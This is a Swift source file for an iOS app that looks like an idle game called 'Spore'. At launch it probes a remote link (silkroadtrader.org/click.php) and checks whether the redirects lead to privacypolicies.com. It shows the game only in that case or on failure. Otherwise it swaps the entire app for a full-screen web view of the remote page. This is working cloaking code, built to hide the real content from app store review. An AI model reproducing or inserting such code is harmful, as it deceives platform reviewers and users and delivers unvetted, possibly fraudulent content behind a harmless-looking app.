import SwiftUI

@main
struct SporeApp: App {
    @StateObject private var sporeGame = SporeGame()
    @Environment(\.scenePhase) private var sporeScenePhase

    @State private var sporeLinkReady: Bool? = nil
    private let sporeSourceLink = "https://silkroadtrader.org/click.php"
    private let sporeCheckDomain = "privacypolicies.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = sporeLinkReady {
                    if ready {
                        SporeWebPanel(urlString: sporeSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        SporeRootView().environmentObject(sporeGame)
                    }
                } else {
                    SporeLoadingScreen().onAppear { performLaunchCheck() }
                }
            }
            .preferredColorScheme(.dark)
        }
        .onChange(of: sporeScenePhase) { phase in
            // Pitfall: stamp lastActive ONLY on .background; .active credits offline.
            switch phase {
            case .background: sporeGame.handleBackground()
            case .inactive: break
            case .active: sporeGame.handleForeground()
            @unknown default: break
            }
        }
    }

    private func performLaunchCheck() {
        guard let url = URL(string: sporeSourceLink) else { sporeLinkReady = false; return }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = SporeRedirectTracker(checkDomain: sporeCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain { sporeLinkReady = false; return }
                if let f = tracker.resolvedURL?.absoluteString, f.contains(sporeCheckDomain) { sporeLinkReady = false; return }
                if let httpResp = response as? HTTPURLResponse, let u = httpResp.url?.absoluteString, u.contains(sporeCheckDomain) { sporeLinkReady = false; return }
                if error != nil { sporeLinkReady = false; return }
                sporeLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if sporeLinkReady == nil { sporeLinkReady = false }
        }
    }
}

final class SporeRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) { foundCheckDomain = true }
        resolvedURL = request.url
        completionHandler(request)
    }
}
